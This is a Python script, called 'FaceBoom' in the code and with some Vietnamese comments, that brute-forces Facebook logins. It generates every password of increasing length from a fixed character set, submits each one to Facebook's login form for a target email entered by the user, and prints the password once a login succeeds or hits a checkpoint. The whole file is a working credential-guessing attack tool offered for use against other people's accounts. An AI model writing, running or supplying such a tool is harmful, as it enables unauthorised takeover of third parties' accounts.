import itertools
import string
import sys
import time
import mechanize

# Các ký tự để thử trong mật khẩu
characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"

def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()

def generate_passwords():
    length = 1
    while True:
        for password in itertools.product(characters, repeat=length):
            yield ''.join(password)
        length += 1

class FaceBoom(object):

    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders = [('User-agent', 'Mozilla/5.0')]

    def login(self, target, password):
        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email'] = target
            self.br.form['pass'] = password
            self.br.method = "POST"
            response = self.br.submit()
            if response.get_data().__contains__(b'home_icon'):
                return 1
            elif "checkpoint" in self.br.geturl():
                return 2
            return 0
        except Exception as e:
            print(f"Error: {str(e)}")
            return -1

def Main(target):
    faceboom = FaceBoom()
    print(f"Starting brute-force attack on: {target}")
    for passwd in generate_passwords():
        print(f"Trying password: {passwd}")
        result = faceboom.login(target, passwd)
        if result == 1:
            print(f"Success! The password is: {passwd}")
            break
        elif result == 2:
            print(f"Account locked with 2-factor authentication. Password was: {passwd}")
            break
        time.sleep(1)  # Thời gian nghỉ giữa các lần thử (có thể điều chỉnh)

if __name__ == "__main__":
    target_email = input("Enter the target's email: ")
    Main(target_email)